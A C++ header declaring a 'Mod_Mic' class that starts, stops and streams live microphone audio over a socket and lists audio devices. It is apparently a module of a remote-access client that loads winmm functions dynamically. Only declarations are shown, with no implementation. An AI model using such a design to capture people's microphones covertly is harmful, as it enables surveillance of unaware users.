#ifdef __MOD_MIC

#ifndef ___MIC
#define ___MIC

#include "headers.hpp"
#include "cliente.hpp"
#include "mod_dynamic_load.hpp"
#include <mmsystem.h>

class Cliente;

class Mod_Mic{
	private:
		std::thread thLiveMic;
		std::mutex mic_mutex;

	public:
		st_WinmmMic WINMM;

		bool isLiveMic = false;
		SOCKET sckSocket = INVALID_SOCKET;
	
		int p_DeviceID = WAVE_MAPPER; //Default
		void m_EmpezarLive();
		void m_DetenerLive();
		bool m_IsLive();

		void m_LiveMicTh(); //thread para mandar mic en tiempo real
		void m_Enviar_Dispositivos();
		std::vector<std::string> m_ObtenerDispositivos();

		Mod_Mic(st_WinmmMic& _winmm);
};

#endif

#endif